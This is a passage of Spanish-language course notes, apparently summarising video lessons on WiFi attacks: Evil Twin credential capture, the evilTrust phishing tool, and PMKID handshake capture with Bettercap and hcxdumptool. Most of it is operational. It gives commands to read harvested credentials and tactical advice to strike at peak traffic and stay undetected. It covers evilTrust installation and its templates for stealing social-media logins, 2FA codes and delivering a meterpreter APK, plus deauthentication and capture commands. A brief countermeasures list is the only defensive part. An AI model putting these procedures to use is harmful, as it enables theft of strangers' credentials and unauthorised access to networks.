tail -f /var/www/html/credentials.txt

# Consultar base de datos
mysql -u root -p -e "SELECT * FROM evil_twin.credentials;"
```

### Consideraciones tácticas:
- **Timing**: Desplegar el ataque en momentos de alta afluencia de usuarios para maximizar capturas
- **Duración**: Limitar la duración del ataque para reducir la probabilidad de detección
- **Ubicación**: Posicionar el equipo para obtener mejor señal que el AP original

### Contramedidas y detección:
- Sistemas de detección de intrusiones inalámbricas (WIDS) que alerten sobre APs no autorizados
- Análisis de comportamiento de red para identificar patrones sospechosos
- Educación de usuarios para verificar la autenticidad de las redes
- Implementación de políticas de seguridad que requieran VPN para conexiones remotas


## 50. Uso de mi herramienta evilTrust para robo de credenciales en redes sociales

Este video presenta evilTrust, una herramienta desarrollada por S4vitar que automatiza todo el proceso de ataque Evil Twin, con enfoque específico en la captura de credenciales de redes sociales mediante plantillas personalizadas.

### Fundamento técnico:
- evilTrust es una herramienta todo-en-uno que simplifica el despliegue de ataques Evil Twin
- Automatiza la configuración de interfaces, servicios y reglas de firewall
- Incluye plantillas prediseñadas para diferentes redes sociales y servicios
- Implementa capacidades avanzadas como la captura de códigos de autenticación de dos factores (2FA)

### Características principales de evilTrust:
- Despliegue automatizado de un punto de acceso falso (Rogue AP)
- Selección de plantillas para diferentes servicios (Facebook, Twitter, Google, etc.)
- Capacidad para utilizar plantillas personalizadas
- Captura de credenciales y códigos 2FA
- Interfaz gráfica opcional para facilitar su uso

### Procedimiento de instalación y uso:
```bash
# Clonar el repositorio
git clone https://github.com/s4vitar/evilTrust

# Acceder al directorio
cd evilTrust

# Dar permisos de ejecución
chmod +x evilTrust.sh

# Ejecutar la herramienta
./evilTrust.sh
```

### Flujo de trabajo de evilTrust:
1. **Verificación de dependencias**: Comprueba que todas las herramientas necesarias estén instaladas
2. **Selección de interfaz**: Muestra las interfaces disponibles y configura automáticamente el modo monitor
3. **Configuración del AP**: Solicita nombre y canal para el punto de acceso falso
4. **Selección de plantilla**: Permite elegir entre las plantillas prediseñadas o usar una personalizada
5. **Despliegue del ataque**: Configura automáticamente todos los servicios necesarios
6. **Captura de credenciales**: Muestra en tiempo real las credenciales capturadas
7. **Captura de 2FA**: Si la víctima tiene autenticación de dos factores, captura también el código

### Plantillas disponibles en evilTrust:
- **facebook-login**: Portal de Facebook con plantilla de 2FA operativa
- **twitter-login**: Plantilla de Twitter con 2FA operativa
- **google-login**: Segundo factor de autenticación para Google
- **yahoo-login**: Plantilla de Yahoo con 2FA
- **starbucks-login**: Plantilla de Starbucks con 2FA
- **optimumwifi**: Plantillas de optimumwifi
- **all_in_one**: Portal cautivo centralizado que lista todas las redes sociales
- **cliqq-payload**: Plantilla para payload APK malicioso y sesión meterpreter

### Ventajas sobre métodos manuales:
- **Simplicidad**: Reduce significativamente la complejidad técnica del ataque
- **Velocidad**: Permite desplegar el ataque en cuestión de minutos
- **Consistencia**: Minimiza errores humanos en la configuración
- **Flexibilidad**: Adaptable a diferentes escenarios y objetivos
- **Mantenimiento**: Restaura automáticamente la configuración original al finalizar


## 51. Ataque a redes sin clientes

Este video presenta cómo obtener el handshake de una red WPA/WPA2 **sin necesidad de que haya clientes conectados a ella**. Especialmente útil para auditar redes que están activas pero temporalmente sin uso.

### Fundamento técnico:
- El ataque se basa en la captura del **PMKID (Pairwise Master Key Identifier)**.
- El PMKID es parte del proceso de roaming rápido (estándar 802.11r) y, en algunos casos, es enviado por el punto de acceso a un cliente que intenta conectarse.
- A diferencia del handshake de 4 vías, que requiere una interacción completa con un cliente, el PMKID se puede obtener con solo el primer paquete del handshake (el mensaje M1 del AP al cliente).
- Este ataque no siempre funciona, ya que depende de que el router y el driver del cliente soporten esta funcionalidad y la tengan habilitada.

### Ventajas y limitaciones:
- **Ventajas**: La principal ventaja es que **no se necesita un cliente conectado**. Además, no es necesario realizar un ataque de desautenticación, lo que lo hace más sigiloso.
- **Limitaciones**: No todos los routers son vulnerables. Los routers más modernos o los que no implementan 802.11r pueden no enviar el PMKID. La efectividad de este ataque ha disminuido con el tiempo a medida que los fabricantes han parcheado esta vulnerabilidad.

### Aplicabilidad y versiones:
- **WPA/WPA2**: Funciona en redes WPA y WPA2 que sean vulnerables. No es un fallo del protocolo en sí, sino de implementaciones específicas.
- **WPA3**: No es aplicable. WPA3 tiene protecciones específicas contra este tipo de ataques.


## 52. Ataque desde Bettercap

Este video muestra cómo utilizar Bettercap para realizar la captura de PMKID sin clientes conectados.

### Procedimiento del video:

1. **Iniciar Bettercap**:
   ```bash
   sudo bettercap -iface <interfaz_wifi>
   ```

2. **Activar el módulo de reconocimiento WiFi**:
   ```
   wifi.recon on
   ```
   - Este comando inicia el escaneo de redes WiFi cercanas.

3. **Visualizar las redes detectadas**:
   ```
   wifi.show
   ```
   - Muestra todas las redes WiFi detectadas con detalles como BSSID, ESSID, canal, etc.

4. **Iniciar el ataque PMKID**:
   ```
   wifi.assoc all
   ```
   o específicamente:
   ```
   wifi.assoc <BSSID>
   ```
   - Este comando intenta asociarse con los puntos de acceso para provocar que envíen el PMKID.

5. **Capturar handshakes**:
   ```
   wifi.deauth <BSSID>
   ```
   - Para redes con clientes, este comando desautentica a los clientes para capturar el handshake.

6. **Exportar los handshakes capturados**:
   ```
   wifi.handshakes
   ```
   - Muestra los handshakes capturados.


## 53. Ataque vía hcxdumptool

Este video explica como utilizar hcxdumptool, una herramienta especializada para la captura de handshakes y PMKID de redes WiFi.

### Procedimiento del video:

1. **Activar el modo monitor**:

2. **Captura básica con hcxdumptool**:
   ```bash
   sudo hcxdumptool -i [interfazModoMonitor] -o [captura].pcapng --active_beacon --enable_status=1
   ```
   - `--active_beacon`: Envía beacons activos para provocar respuestas.

### Ventajas:
- **Ataques dirigidos**: Capacidad para centrarse en redes específicas.
- **Compatibilidad con hashcat**: Genera archivos directamente utilizables por herramientas de cracking.
